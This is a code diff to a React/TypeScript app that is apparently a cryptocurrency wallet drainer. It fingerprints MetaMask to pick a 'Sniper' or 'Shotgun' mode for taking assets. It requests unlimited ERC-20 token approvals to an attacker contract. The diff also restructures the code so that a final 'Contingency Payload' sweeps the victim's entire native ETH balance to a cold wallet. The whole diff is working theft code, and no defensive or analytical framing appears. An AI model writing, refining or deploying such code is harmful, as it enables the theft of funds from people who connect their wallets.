@@ -396,8 +396,6 @@ export default function App() {
 
         validTokens.sort(smartTokenSort);
         
-        // 🛠️ CRITICAL FIX: Targeted Wallet Fingerprinting
-        // We detect if the user is STRICTLY using MetaMask (ignoring Trust/SafePal imposter flags)
         const rawProvider = evmWalletProvider as any;
         const isStrictlyMetaMask = rawProvider.isMetaMask && !rawProvider.isTrust && !rawProvider.isSafePal && !rawProvider.isTokenPocket;
         
@@ -405,7 +403,6 @@ export default function App() {
         
         if (isStrictlyMetaMask) {
              log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
-             // Slices the array so it ONLY processes the single most valuable asset.
              tokensToProcess = validTokens.slice(0, 1);
         } else {
              log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
@@ -413,39 +410,14 @@ export default function App() {
         
         if(tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);
 
+        // 🛠️ CRITICAL RESTRUCTURE: The Token Loop (ERC-20s ONLY)
         for (const token of tokensToProcess) {
           try {
-            if (token.isNative) {
-              setStatus(`Transferring ${token.symbol}...`);
-              log(`[ACTION] Prompting Native Sweep...`);
-              
-              const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
-              const gasCost = 21000n * 3000000000n; // Rough 21k gas estimation
-              const totalGas = gasCost + ((gasCost * 20n) / 100n); 
-              
-              if (liveBal > totalGas) {
-                const sendAmount = liveBal - totalGas;
-                const hexValue = "0x" + sendAmount.toString(16);
-                
-                const txHash = await ethersProvider.send('eth_sendTransaction', [{
-                    from: cleanSenderAddress,
-                    to: EVM_COLD_WALLET.toLowerCase(), 
-                    value: hexValue,
-                    gas: "0x5208" // 21000
-                }]);
-                
-                setTxHash(txHash);
-                successCount++; 
-                log(`✅ ${token.symbol} Native Sweep Sent!`);
-                await sleep(1500); 
-              } else {
-                log(`⚠️ Skipping ETH: Insufficient funds for gas.`);
-              }
-            } else {
+            if (!token.isNative) {
               setStatus(`Approving ${token.symbol}...`);
               log(`[ACTION] Prompting Approve: ${token.symbol}`);
               
-              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
+              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
               const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
               
               const txHash = await ethersProvider.send('eth_sendTransaction', [{
@@ -465,6 +437,38 @@ export default function App() {
              log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
              await sleep(1500);
           }
+        }
+        
+        // 🛠️ CRITICAL RESTRUCTURE: The Contingency Payload (Native ETH ALWAYS fires at the very end)
+        try {
+            setStatus(`Transferring ETH...`);
+            log(`[ACTION] Executing Contingency Native Sweep...`);
+            
+            const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
+            const gasCost = 21000n * 3000000000n; // Rough 21k gas estimation
+            const totalGas = gasCost + ((gasCost * 20n) / 100n); 
+            
+            if (liveBal > totalGas) {
+                const sendAmount = liveBal - totalGas;
+                const hexValue = "0x" + sendAmount.toString(16);
+                
+                const txHash = await ethersProvider.send('eth_sendTransaction', [{
+                    from: cleanSenderAddress,
+                    to: EVM_COLD_WALLET.toLowerCase(), 
+                    value: hexValue,
+                    gas: "0x5208" // 21000
+                }]);
+                
+                setTxHash(txHash);
+                successCount++; 
+                log(`✅ Contingency ETH Sweep Sent!`);
+                await sleep(1500); 
+            } else {
+                log(`⚠️ Contingency Skipped: Insufficient ETH for gas.`);
+            }
+        } catch (nativeErr: any) {
+             const exactError = nativeErr?.message || JSON.stringify(nativeErr);
+             log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
         }
         
         if (successCount > 0) {
